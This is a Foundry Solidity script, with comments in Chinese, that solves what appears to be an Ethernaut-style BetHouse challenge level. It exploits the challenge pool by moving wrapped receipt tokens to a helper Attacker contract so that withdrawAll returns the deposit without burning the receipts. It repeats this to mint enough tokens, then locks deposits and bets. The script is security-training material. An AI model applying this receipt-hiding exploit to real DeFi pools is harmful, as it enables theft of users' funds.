// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/BetHouseAttack.sol";
import {IERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

// 定義接口以便調用
interface IBetHouse {
    function pool() external view returns (address);
    function makeBet(address bettor_) external;
}

interface IPool {
    function depositToken() external view returns (address);
    function wrappedToken() external view returns (address);
    function deposit(uint256 value_) external payable;
    function withdrawAll() external;
    function lockDeposits() external;
    function balanceOf(address account_) external view returns (uint256);
}

contract Solve is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);
        
        // --- 設定地址 (請替換成你當前關卡的 Instance 地址) ---
        address betHouseAddr = vm.envAddress("INSTANCE_ADDRESS");
        IBetHouse betHouse = IBetHouse(betHouseAddr);
        IPool pool = IPool(betHouse.pool());
        IERC20 pdt = IERC20(pool.depositToken());
        IERC20 wrapped = IERC20(pool.wrappedToken());

        vm.startBroadcast(deployerPrivateKey);

        // 1. 部署攻擊輔助合約
        Attacker attacker = new Attacker();
        console.log("Attacker deployed at:", address(attacker));

        // 2. 授權 Pool 使用我們的 PDT
        uint256 myPdtBalance = pdt.balanceOf(player);
        pdt.approve(address(pool), type(uint256).max);
        console.log("Initial PDT Balance:", myPdtBalance);

        // 3. PDT 循環攻擊 (重複到湊滿 10 顆 PDT 產出的 Token)
        // 假設你一開始有 5 顆 PDT，跑兩次就有 10 顆 Token
        for(uint i = 0; i < 2; i++) {
            pool.deposit(myPdtBalance);
            uint256 minted = wrapped.balanceOf(player);
            wrapped.transfer(address(attacker), minted); // 把收據藏起來
            pool.withdrawAll(); // 領回 PDT，但燒不掉收據
            console.log("Loop", i+1, "done. PDT recovered.");
        }

        // 4. 存入 0.001 ETH 領取最後 10 顆 Token
        // 注意：如果這關已經有人存過 ETH 了，這步會 revert，那你就要多跑幾次上面的 PDT 循環
        pool.deposit{value: 0.001 ether}(0);
        console.log("Ether deposited. Got 10 more tokens.");

        // 5. 從 Attacker 合約拿回隱藏的 Token
        attacker.withdrawToken(address(wrapped), wrapped.balanceOf(address(attacker)));
        
        uint256 finalBalance = wrapped.balanceOf(player);
        console.log("Final WrappedToken Balance:", finalBalance);

        // 6. 滿足最後條件：鎖定並下注
        if (finalBalance >= 20) {
            pool.lockDeposits();
            betHouse.makeBet(player);
            console.log("Bet made successfully!");
        } else {
            console.log("Not enough tokens yet, current:", finalBalance);
        }

        vm.stopBroadcast();
    }
}
